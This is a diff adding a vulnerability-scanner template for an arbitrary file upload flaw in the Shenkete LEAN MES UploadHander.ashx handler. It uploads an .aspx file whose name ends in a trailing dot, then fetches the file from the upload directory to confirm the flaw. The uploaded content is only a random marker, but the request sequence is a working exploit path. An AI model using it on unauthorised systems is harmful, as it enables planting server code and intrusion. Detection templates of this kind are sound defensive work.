@@ -1,0 +1,38 @@
+id: shenkete-UploadHander-upload
+
+info:
+  name: 深科特 LEAN MES系统 UploadHander.ashx 任意文件上传漏洞
+  author: shenkete
+  severity: high
+  tags: shenkete
+
+http:
+  - raw:
+      - |
+        POST /Handler/UploadHander.ashx?Action=ImportResultData HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="Filedata"; filename="1ds028gpfkuq9dj.aspx."
+        
+        {{randstr}}
+        ------WebKitFormBoundary--
+
+      - |+
+        GET /UploadFiles/TemporaryFile/1ds028gpfkuq9dj.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
